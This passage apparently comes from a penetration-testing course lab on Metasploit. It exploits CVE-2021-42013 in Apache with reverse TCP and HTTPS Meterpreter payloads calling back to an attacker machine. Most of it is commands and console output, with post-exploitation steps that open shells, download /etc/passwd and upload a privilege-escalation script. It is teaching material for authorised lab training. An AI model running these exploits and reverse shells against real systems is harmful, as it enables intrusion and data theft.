### Payload Options for `linux/x64/meterpreter_reverse_tcp`

| Name  | Current Setting | Required | Description |
|-------|-----------------|----------|-------------|
| LHOST | 192.168.119.2   | Yes      | The listen address (an interface may be specified) |
| LPORT | 4444            | Yes      | The listen port |

### Listing 650: Reviewing Compatible Meterpreter Payloads

Listing 650 demonstrates the various Meterpreter payloads compatible with the currently activated exploit module. All Meterpreter payloads are staged, meaning they use a two-stage process to transfer the payload to the target machine. However, the `show payloads` command lists both staged and non-staged payloads.

**Staged vs. Non-Staged Payloads:**
- **Staged Payloads:** These payloads use a small initial stage to download and execute the full Meterpreter session. This method reduces the size of the initial payload but can generate more network traffic.
- **Non-Staged Payloads:** These payloads include all necessary components in a single package, reducing the need for additional network transfers. They are useful in scenarios with limited bandwidth or when targeting multiple systems.

For the remainder of this module, we will use the non-staged version of the `meterpreter_reverse_tcp` payload.

**References:**
- [Buffered, 2016](https://buffered.io/posts/staged-vs-stageless-handlers/)
- [Rapid7, 2015](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)

### Running the Exploit Module with the Meterpreter Payload

After selecting the 64-bit non-staged version of `meterpreter_reverse_tcp`, we can review its options. The same options apply as for the previous payloads we used.

```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > run
[*] Started reverse TCP handler on 192.168.119.4:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.50.16:80 - Sending linux/x64/meterpreter_reverse_tcp command payload
[*] Meterpreter session 4 opened (192.168.119.4:4444 -> 192.168.50.16:35538) at 2022-08-08 05:20:20 -0400
[!] This exploit may require manual cleanup of '/tmp/GfRglhc' on the target
```

### Meterpreter Commands

Once we obtain a Meterpreter command prompt, we can display its available commands by entering `help`.

#### Core Commands

| Command  | Description |
|----------|-------------|
| `?`      | Help menu |
| `background` | Backgrounds the current session |
| `channel` | Displays information or controls active channels |
| `close`  | Closes a channel |
| `info`   | Displays information about a Post module |
| `load`   | Load one or more Meterpreter extensions |
| `run`    | Executes a Meterpreter script or Post module |
| `secure` | (Re)Negotiate TLV packet encryption on the session |
| `sessions` | Quickly switch to another session |

#### Stdapi: System Commands

| Command  | Description |
|----------|-------------|
| `execute` | Execute a command |
| `getenv`  | Get one or more environment variable values |
| `getpid`  | Get the current process identifier |
| `getuid`  | Get the user that the server is running as |
| `kill`    | Terminate a process |
| `localtime` | Displays the target system local date and time |
| `pgrep`   | Filter processes by name |
| `pkill`   | Terminate processes by name |
| `ps`      | List running processes |
| `shell`   | Drop into a system command shell |
| `suspend` | Suspends or resumes a list of processes |
| `sysinfo` | Gets information about the remote system, such as OS |

### Gathering Information with Meterpreter

Let's gather information using the `sysinfo` and `getuid` commands.

```bash
meterpreter > sysinfo
Computer : 172.29.0.2
OS : Ubuntu 20.04 (Linux 5.4.0-122-generic)
Architecture : x64
BuildTuple : x86_64-linux-musl
Meterpreter : x64/linux
meterpreter > getuid
Server username: daemon
```

These commands provide information about the target computer, operating system, and the current user.

### Managing Sessions and Channels

Metasploit uses sessions to manage access to different machines. Within a session, Metasploit uses channels to interact with the target system. Let's start an interactive shell, execute a command, and background the channel.

```bash
meterpreter > shell
Process 194 created.
Channel 1 created.
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
^Z
Background channel 1? [y/N] y
meterpreter >
```

Next, let's start a second interactive shell, execute a command, and background the channel.

```bash
meterpreter > shell
Process 196 created.
Channel 2 created.
whoami
daemon
^Z
Background channel 2? [y/N] y
meterpreter >
```

Now, let's list all active channels and interact with channel 1 again.

```bash
meterpreter > channel -l
Id Class Type
-- ----- ----
1 3 stdapi_process
2 3 stdapi_process
meterpreter > channel -i 1
Interacting with channel 1...
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Using channels helps manage system access and perform post-exploitation operations.

### File System Commands

Let's use the `download` and `upload` commands from the File system Commands category to transfer files to and from the system.

#### File System Commands

| Command  | Description |
|----------|-------------|
| `cat`    | Read the contents of a file to the screen |
| `cd`     | Change directory |
| `checksum` | Retrieve the checksum of a file |
| `chmod`  | Change the permissions of a file |
| `cp`     | Copy source to destination |
| `del`    | Delete the specified file |
| `dir`    | List files (alias for `ls`) |
| `download` | Download a file or directory |
| `edit`   | Edit a file |
| `getlwd` | Print local working directory |
| `getwd`  | Print working directory |
| `lcat`   | Read the contents of a local file to the screen |
| `lcd`    | Change local working directory |
| `lls`    | List local files |
| `lpwd`   | Print local working directory |
| `ls`     | List files |
| `mkdir`  | Make directory |
| `mv`     | Move source to destination |
| `pwd`    | Print working directory |
| `rm`     | Delete the specified file |
| `rmdir`  | Remove directory |
| `search` | Search for files |
| `upload` | Upload a file or directory |

Let's download `/etc/passwd` from the target machine to our Kali system.

```bash
meterpreter > lpwd
/home/kali
meterpreter > lcd /home/kali/Downloads
meterpreter > lpwd
/home/kali/Downloads
meterpreter > download /etc/passwd
[*] Downloading: /etc/passwd -> /home/kali/Downloads/passwd
[*] Downloaded 1.74 KiB of 1.74 KiB (100.0%): /etc/passwd -> /home/kali/Downloads/passwd
[*] download : /etc/passwd -> /home/kali/Downloads/passwd
meterpreter > lcat /home/kali/Downloads/passwd
root:x:0:0:root:/root:/bin/bash
...
```

Next, let's upload `unix-privesc-check` to `/tmp` on the target system.

```bash
meterpreter > upload /usr/bin/unix-privesc-check /tmp/
[*] uploading : /usr/bin/unix-privesc-check -> /tmp/
[*] uploaded : /usr/bin/unix-privesc-check -> /tmp//unix-privesc-check
meterpreter > ls /tmp
Listing: /tmp
=============
Mode Size Type Last modified Name
---- ---- ---- ------------- ----
...
100644/rw-r--r-- 36801 fil 2022-08-08 05:26:15 -0400 unix-privesc-check
```

### Using Another 64-bit Linux Meterpreter Payload

Before moving to the next section, let's use another 64-bit Linux Meterpreter payload, `linux/x64/meterpreter_reverse_https`. This payload uses HTTPS to establish the connection and communication between the infected target and our Kali machine, encrypting the traffic with SSL/TLS.

```bash
meterpreter > exit
[*] Shutting down Meterpreter...
[*] 192.168.50.16 - Meterpreter session 4 closed. Reason: User exit
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads

Compatible Payloads
===================
# Name Disclosure Date Rank Check Description
- ---- --------------- ---- ---- -----------
...
10 payload/linux/x64/meterpreter_reverse_https normal No Linux Meterpreter, Reverse HTTPS Inline
...

msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 10
payload => linux/x64/meterpreter_reverse_https
msf6 exploit(multi/http/apache_normalize_path_rce) > show options

Payload options (linux/x64/meterpreter_reverse_https):
Name Current Setting Required Description
---- --------------- -------- -----------
LHOST 192.168.119.2 yes The local listener hostname
LPORT 4444 yes The local listener port
LURI no The HTTP Path
...

msf6 exploit(multi/http/apache_normalize_path_rce) > run
[*] Started HTTPS reverse handler on https://192.168.119.4:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
```

The `LURI` option can be used to leverage a single listener on one port capable of handling different requests based on the path. If left blank, Metasploit uses `/` as the path.